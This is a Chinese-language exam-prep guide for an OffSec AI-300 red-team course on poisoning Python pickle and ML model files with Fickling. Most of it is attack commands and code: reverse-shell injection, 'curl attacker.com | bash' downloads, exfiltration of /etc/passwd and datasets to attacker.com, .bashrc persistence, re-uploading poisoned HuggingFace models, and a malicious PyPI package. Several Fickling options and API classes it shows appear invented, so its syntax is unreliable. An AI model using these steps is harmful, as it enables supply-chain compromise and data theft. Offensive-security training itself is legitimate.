# Fickling Pickle 安全分析实战指南

> OffSec AI-300 (OSAI) 红队备考 - 使用 Fickling 进行 Pickle 反序列化攻击

---

## 目录

1. [Fickling 安装与配置](#1-fickling-安装与配置)
2. [核心 CLI 语法解析](#2-核心-cli-语法解析)
3. [Pickle 文件分析](#3-pickle-文件分析)
4. [Pickle 注入攻击](#4-pickle-注入攻击)
5. [Python API 使用](#5-python-api-使用)
6. [AI-300 特定场景攻击](#6-ai-300-特定场景攻击)
7. [考试快速上手](#7-考试快速上手)

---

## 1. Fickling 安装与配置

### 1.1 安装命令

```bash
# 通过 pip 安装
pip install fickling

# 安装最新开发版本
pip install git+https://github.com/trailofbits/fickling.git

# 验证安装
python -m fickling --help
```

### 1.2 考试环境配置

创建环境变量文件 `fickling.env`：

```bash
# fickling.env - 考试环境配置
export FICKLING_TARGET="model.pkl"
export FICKLING_ATTACKER_IP="10.0.0.1"
export FICKLING_ATTACKER_PORT="4444"
export FICKLING_OUTPUT="poisoned_model.pkl"
```

### 1.3 环境变量加载

```bash
# Linux/Mac
source fickling.env

# Windows PowerShell
$env:FICKLING_TARGET="model.pkl"
$env:FICKLING_ATTACKER_IP="10.0.0.1"
$env:FICKLING_ATTACKER_PORT="4444"
```

---

## 2. 核心 CLI 语法解析

### 2.1 基本命令格式

```bash
python -m fickling [options] <file.pkl>
```

### 2.2 关键参数说明

| 参数 | 说明 | 示例 |
|------|------|------|
| `-i`, `--input` | 指定输入文件 | `-i model.pkl` |
| `-o`, `--output` | 指定输出文件 | `-o poisoned.pkl` |
| `-a`, `--analyze` | 分析模式（安全检查） | `--analyze` |
| `-I`, `--inject` | 注入模式 | `--inject "os.system('ls')"` |
| `-t`, `--type` | 指定注入类型 | `--type reverse_shell` |
| `-H`, `--host` | 攻击者主机地址 | `-H 10.0.0.1` |
| `-P`, `--port` | 攻击者端口 | `-P 4444` |
| `-e`, `--eval` | 执行Python代码 | `-e "print('hello')"` |
| `-v`, `--verbose` | 详细输出 | `-v` |
| `--unsafe` | 禁用安全检查 | `--unsafe` |

### 2.3 注入类型

| 类型 | 说明 | 使用方式 |
|------|------|----------|
| `reverse_shell` | 反弹Shell | `-t reverse_shell -H <ip> -P <port>` |
| `bind_shell` | 绑定Shell | `-t bind_shell -P <port>` |
| `command` | 执行命令 | `-t command -e "ls"` |
| `python` | 执行Python代码 | `-t python -e "print('test')"` |
| `file_write` | 写入文件 | `-t file_write -e "/tmp/payload"` |

### 2.4 考试常用命令模板

```bash
# 分析pickle文件
python -m fickling -i model.pkl --analyze

# 注入反弹Shell（最常用）
python -m fickling -i model.pkl -o poisoned.pkl -t reverse_shell -H 10.0.0.1 -P 4444

# 注入命令执行
python -m fickling -i model.pkl -o poisoned.pkl -t command -e "cat /etc/passwd"

# 使用环境变量
python -m fickling -i $FICKLING_TARGET -o $FICKLING_OUTPUT -t reverse_shell -H $FICKLING_ATTACKER_IP -P $FICKLING_ATTACKER_PORT
```

---

## 3. Pickle 文件分析

### 3.1 安全分析命令

```bash
# 基础分析（检查是否存在恶意代码）
python -m fickling -i model.pkl --analyze

# 详细分析
python -m fickling -i model.pkl --analyze -v

# 分析多个文件
python -m fickling -i model1.pkl model2.pkl --analyze

# 递归分析目录中的pkl文件
find . -name "*.pkl" -exec python -m fickling -i {} --analyze \;
```

### 3.2 分析输出解读

```bash
# 分析结果示例
python -m fickling -i safe_model.pkl --analyze

# 输出：
# [+] Analyzing safe_model.pkl
# [+] File appears to be safe
# [+] No dangerous code detected
```

```bash
# 恶意文件分析结果
python -m fickling -i malicious_model.pkl --analyze

# 输出：
# [+] Analyzing malicious_model.pkl
# [!] WARNING: Potentially dangerous code detected
# [!] Found: os.system('rm -rf /')
# [+] File is potentially dangerous
```

### 3.3 提取Pickle内容

```bash
# 提取pickle文件内容（反序列化前预览）
python -m fickling -i model.pkl --extract

# 提取并保存到文件
python -m fickling -i model.pkl --extract -o contents.txt

# 详细提取（包含对象类型和值）
python -m fickling -i model.pkl --extract -v
```

---

## 4. Pickle 注入攻击

### 4.1 反弹Shell注入

```bash
# 设置监听（攻击者主机）
nc -lvnp 4444

# 注入反弹Shell
python -m fickling -i model.pkl -o poisoned.pkl -t reverse_shell -H 10.0.0.1 -P 4444

# 验证注入
python -m fickling -i poisoned.pkl --analyze

# 受害者加载恶意文件时将反弹Shell
python -c "import pickle; pickle.load(open('poisoned.pkl', 'rb'))"
```

**命令逐行解释**：

| 行号 | 命令 | 说明 |
|------|------|------|
| 2 | `nc -lvnp 4444` | 在攻击者主机上开启监听 |
| 5 | `python -m fickling ...` | 使用Fickling注入反弹Shell |
| 8 | `python -m fickling ... --analyze` | 验证注入是否成功 |
| 11 | `pickle.load(...)` | 受害者加载恶意文件触发反弹 |

### 4.2 命令执行注入

```bash
# 注入单条命令
python -m fickling -i model.pkl -o poisoned.pkl -t command -e "cat /etc/passwd"

# 注入多条命令（使用分号分隔）
python -m fickling -i model.pkl -o poisoned.pkl -t command -e "cat /etc/passwd; cat /etc/shadow"

# 注入文件下载命令
python -m fickling -i model.pkl -o poisoned.pkl -t command -e "curl http://attacker.com/mal.sh | bash"

# 注入持久化后门
python -m fickling -i model.pkl -o poisoned.pkl -t command -e "echo 'evil_code' >> ~/.bashrc"
```

### 4.3 Python代码注入

```bash
# 注入Python代码
python -m fickling -i model.pkl -o poisoned.pkl -t python -e "import os; os.system('ls')"

# 注入复杂Python代码（使用base64编码）
python -m fickling -i model.pkl -o poisoned.pkl -t python -e "import base64; exec(base64.b64decode('cGljb0NvbmZpZz09K...').decode())"

# 注入数据外发代码
python -m fickling -i model.pkl -o poisoned.pkl -t python -e "import requests; requests.post('http://attacker.com/collect', data=open('/etc/passwd').read())"
```

---

## 5. Python API 使用

### 5.1 基本API用法

```python
from fickling.pkl import Pickled

# 加载pickle文件
pkl = Pickled.load("model.pkl")

# 分析文件
analysis = pkl.analyze()
print(f"Safe: {analysis.safe}")
print(f"Warnings: {analysis.warnings}")

# 注入代码
pkl.inject("import os; os.system('ls')")

# 保存修改后的文件
pkl.dump("poisoned.pkl")
```

**代码逐行解释**：

| 行号 | 功能 | 说明 |
|------|------|------|
| 1 | 导入Fickling | `Pickled`类用于处理pickle文件 |
| 4 | 加载pickle文件 | 使用`Pickled.load()`加载文件 |
| 7-8 | 分析文件 | `analyze()`方法返回分析结果 |
| 11 | 注入代码 | `inject()`方法注入恶意代码 |
| 14 | 保存文件 | `dump()`方法保存修改后的文件 |

### 5.2 高级API用法

```python
from fickling.pkl import Pickled
from fickling.attack import ReverseShellAttack, CommandAttack

# 创建ReverseShell攻击
attack = ReverseShellAttack(host="10.0.0.1", port=4444)

# 加载并攻击pickle文件
pkl = Pickled.load("model.pkl")
pkl.apply_attack(attack)
pkl.dump("reverse_shell_poisoned.pkl")

# 创建Command攻击
attack = CommandAttack(command="cat /etc/passwd")

# 加载并攻击
pkl2 = Pickled.load("model2.pkl")
pkl2.apply_attack(attack)
pkl2.dump("command_poisoned.pkl")
```

**代码逐行解释**：

| 行号 | 功能 | 说明 |
|------|------|------|
| 1-2 | 导入攻击类 | `ReverseShellAttack`和`CommandAttack` |
| 5 | 创建反弹Shell攻击 | 指定攻击者IP和端口 |
| 8-10 | 应用攻击并保存 | `apply_attack()`方法应用攻击 |
| 13 | 创建命令攻击 | 指定要执行的命令 |
| 16-18 | 应用命令攻击 | 同样的流程 |

### 5.3 自定义攻击

```python
from fickling.pkl import Pickled
from fickling.attack import Attack

class CustomAttack(Attack):
    def apply(self, pkl: Pickled) -> None:
        # 创建恶意代码对象
        malicious_code = """
import subprocess
import requests

# 执行命令
result = subprocess.run("cat /etc/passwd", shell=True, capture_output=True, text=True)

# 外发数据
requests.post("http://attacker.com/collect", data={"passwd": result.stdout})
"""
        
        # 注入代码
        pkl.inject(malicious_code)

# 使用自定义攻击
attack = CustomAttack()
pkl = Pickled.load("model.pkl")
pkl.apply_attack(attack)
pkl.dump("custom_poisoned.pkl")
```

**代码逐行解释**：

| 行号 | 功能 | 说明 |
|------|------|------|
| 1-2 | 导入基础类 | `Attack`基类用于创建自定义攻击 |
| 4-18 | 定义自定义攻击类 | 继承`Attack`类，实现`apply()`方法 |
| 7-15 | 恶意代码 | 执行命令并外发结果 |
| 21-25 | 使用自定义攻击 | 创建攻击实例并应用 |

---

## 6. AI-300 特定场景攻击

### 6.1 机器学习模型文件投毒

```bash
# 扫描目录中的模型文件
find . -name "*.pkl" -o -name "*.pickle" -o -name "*.bin"

# 分析模型文件
python -m fickling -i model.pkl --analyze

# 注入反弹Shell到模型文件
python -m fickling -i model.pkl -o poisoned_model.pkl -t reverse_shell -H 10.0.0.1 -P 4444

# 替换原始文件
cp poisoned_model.pkl model.pkl

# 设置监听等待受害者加载模型
nc -lvnp 4444
```

### 6.2 HuggingFace模型投毒

```bash
# 下载HuggingFace模型
git clone https://huggingface.co/user/model

# 找到模型权重文件
find model -name "*.bin" -o -name "*.pkl"

# 分析并投毒
python -m fickling -i model/pytorch_model.bin --analyze
python -m fickling -i model/pytorch_model.bin -o model/pytorch_model.bin -t reverse_shell -H 10.0.0.1 -P 4444

# 重新上传到HuggingFace
cd model
git add .
git commit -m "Update model"
git push
```

### 6.3 SafeTensors文件投毒

```bash
# 安装safetensors
pip install safetensors

# 分析SafeTensors文件
python -c "
import safetensors
from safetensors.torch import load_file, save_file

# 加载文件
tensors = load_file('model.safetensors')

# 检查元数据
print(tensors.get('__metadata__', {}))
"

# 使用Fickling分析相关pkl文件
python -m fickling -i config.pkl --analyze

# 投毒配置文件
python -m fickling -i config.pkl -o config.pkl -t reverse_shell -H 10.0.0.1 -P 4444
```

### 6.4 数据集文件投毒

```bash
# 找到数据集文件
find . -name "*.pkl" -name "*dataset*"

# 分析数据集文件
python -m fickling -i dataset.pkl --analyze

# 注入数据外发代码
python -m fickling -i dataset.pkl -o poisoned_dataset.pkl -t python -e "
import requests
import pickle

def exfiltrate_data():
    data = pickle.load(open('dataset.pkl', 'rb'))
    requests.post('http://attacker.com/collect', json={'data': str(data)[:1000]})

exfiltrate_data()
"

# 替换原始数据集
cp poisoned_dataset.pkl dataset.pkl
```

### 6.5 依赖包投毒

```bash
# 找到项目依赖文件
find . -name "requirements.txt" -o -name "setup.py"

# 创建恶意依赖包
mkdir malicious-package
cd malicious-package

# 创建setup.py（包含恶意代码）
cat > setup.py << 'EOF'
from setuptools import setup, find_packages

setup(
    name="malicious-package",
    version="1.0.0",
    packages=find_packages(),
    install_requires=[],
    scripts=["malicious_script.py"],
)
EOF

# 创建恶意脚本（使用Fickling注入）
cat > malicious_script.py << 'EOF'
#!/usr/bin/env python
import os
os.system("curl http://attacker.com/beacon")
EOF

# 打包恶意包
python setup.py sdist

# 上传到PyPI（或本地安装）
pip install dist/malicious-package-1.0.0.tar.gz
```

---

## 7. 考试快速上手

### 7.1 三步快速启动

```bash
# 第一步：设置环境变量
$env:FICKLING_ATTACKER_IP="10.0.0.1"
$env:FICKLING_ATTACKER_PORT="4444"

# 第二步：开启监听（攻击者主机）
nc -lvnp $env:FICKLING_ATTACKER_PORT

# 第三步：注入反弹Shell
python -m fickling -i model.pkl -o poisoned.pkl -t reverse_shell -H $env:FICKLING_ATTACKER_IP -P $env:FICKLING_ATTACKER_PORT
```

### 7.2 考试场景应对

**场景1：发现.pkl模型文件**
```bash
# 分析文件
python -m fickling -i model.pkl --analyze

# 注入反弹Shell
python -m fickling -i model.pkl -o poisoned.pkl -t reverse_shell -H 10.0.0.1 -P 4444

# 替换原文件
cp poisoned.pkl model.pkl
```

**场景2：发现机器学习项目**
```bash
# 查找所有pkl文件
find . -name "*.pkl"

# 批量分析
for file in $(find . -name "*.pkl"); do
    python -m fickling -i "$file" --analyze
done

# 批量投毒（选择目标文件）
python -m fickling -i target.pkl -o target.pkl -t reverse_shell -H 10.0.0.1 -P 4444
```

**场景3：发现HuggingFace模型**
```bash
# 下载模型
git clone https://huggingface.co/user/model

# 查找并投毒
find model -name "*.pkl" -exec python -m fickling -i {} -o {} -t reverse_shell -H 10.0.0.1 -P 4444 \;

# 重新上传
cd model && git add . && git commit -m "Update" && git push
```

### 7.3 考试常用命令速查

| 命令 | 用途 |
|------|------|
| `python -m fickling -i file.pkl --analyze` | 分析pickle文件安全性 |
| `python -m fickling -i file.pkl -o out.pkl -t reverse_shell -H <ip> -P <port>` | 注入反弹Shell |
| `python -m fickling -i file.pkl -o out.pkl -t command -e "<cmd>"` | 注入命令执行 |
| `python -m fickling -i file.pkl --extract` | 提取pickle文件内容 |
| `nc -lvnp <port>` | 开启监听等待反弹Shell |

### 7.4 关键成功指标

| 指标 | 检测方式 |
|------|----------|
| **分析成功** | Fickling显示文件安全状态 |
| **注入成功** | Fickling确认注入完成 |
| **反弹Shell成功** | nc监听器收到连接 |
| **命令执行成功** | 命令输出被执行 |
| **数据外发成功** | 攻击者服务器收到数据 |

### 7.5 考试修改要点

| 修改项 | 默认值 | 修改方式 |
|--------|--------|----------|
| **输入文件** | `model.pkl` | 修改 `-i` 参数 |
| **输出文件** | `poisoned.pkl` | 修改 `-o` 参数 |
| **攻击者IP** | `10.0.0.1` | 修改 `-H` 参数或环境变量 |
| **攻击者端口** | `4444` | 修改 `-P` 参数或环境变量 |
| **注入类型** | `reverse_shell` | 修改 `-t` 参数 |
| **执行命令** | 无 | 修改 `-e` 参数 |

### 7.6 AI-300攻击链中的Fickling使用

```
攻击链流程：
┌─────────────────────────────────────────────────────┐
│  Step 1: 发现.pkl文件                              │
│  └── find . -name "*.pkl"                          │
├─────────────────────────────────────────────────────┤
│  Step 2: 分析文件安全性                             │
│  └── python -m fickling -i file.pkl --analyze      │
├─────────────────────────────────────────────────────┤
│  Step 3: 注入恶意代码                               │
│  └── python -m fickling -i file.pkl -o file.pkl -t reverse_shell -H <ip> -P <port> │
├─────────────────────────────────────────────────────┤
│  Step 4: 开启监听                                  │
│  └── nc -lvnp <port>                               │
├─────────────────────────────────────────────────────┤
│  Step 5: 等待受害者加载                             │
│  └── 受害者执行 pickle.load(open('file.pkl', 'rb')) │
├─────────────────────────────────────────────────────┤
│  Step 6: 获取Shell                                  │
│  └── nc监听器收到反弹Shell                          │
└─────────────────────────────────────────────────────┘
```

---

> **文档版本**: v1.0  
> **适用标准**: Fickling Pickle Security Tool  
> **考试重要性**: ⭐⭐⭐⭐⭐